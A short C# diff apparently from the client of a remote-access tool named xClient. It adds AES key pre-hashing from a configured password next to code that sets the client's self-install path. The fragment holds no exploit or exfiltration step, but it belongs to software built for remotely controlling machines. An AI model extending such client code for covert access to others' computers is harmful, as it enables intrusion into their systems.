@@ -6,6 +6,7 @@ using System.Windows.Forms;
 using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
+using xClient.Core.Encryption;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
@@ -112,6 +113,7 @@ namespace xClient
         {
             Thread.Sleep(2000);
 
+            AES.PreHashKey(Settings.PASSWORD);
             SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
             SystemCore.MyPath = Application.ExecutablePath;
             SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
